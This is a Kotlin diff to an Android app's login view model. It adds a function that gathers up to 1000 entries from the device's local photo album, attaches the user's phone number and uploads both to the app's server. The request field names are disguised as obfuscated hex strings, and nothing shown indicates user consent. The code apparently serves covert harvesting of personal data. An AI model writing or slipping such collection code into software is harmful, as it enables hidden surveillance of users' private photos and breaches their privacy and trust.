@@ -2,6 +2,7 @@ package com.dream.bjst.login
 
 import com.blankj.utilcode.util.GsonUtils
 import com.dream.bjst.account.bean.PrivacyBean
+import com.dream.bjst.bean.DevicePhotoParamBean
 import com.dream.bjst.bean.LoginBean
 import com.dream.bjst.bean.LoginParam
 import com.dream.bjst.common.UserManager
@@ -22,6 +23,7 @@ class LoginViewModel : BaseViewModel() {
     val loginResult = SingleLiveEvent<LoginBean>()
     val idCardStatus = SingleLiveEvent<IdCardStatusBean>()
     val privacyResult = SingleLiveEvent<PrivacyBean>()
+    val upDevicePhoto = SingleLiveEvent<Boolean>()
 
     var mNetToken = ""
     fun sendCode(param: String) {
@@ -78,7 +80,18 @@ class LoginViewModel : BaseViewModel() {
             var privacyRes = Api.privacyContent()
             privacyResult.postValue(privacyRes)
         })
+    }
 
+    /**
+     * 上传设备信息 （相册信息）
+     */
+    fun upDevicePhoto() {
+        rxLaunchUI({
+            val filesEnCrypt = DeviceUtils.getLocalAlbumList(0,1000)
+            val paramBean = DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086`= filesEnCrypt,`999B969D9891` = UserManager.getUserPhone())
+            val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
+            upDevicePhoto.postValue(result.`869187819880`)
+        })
     }
 
 }
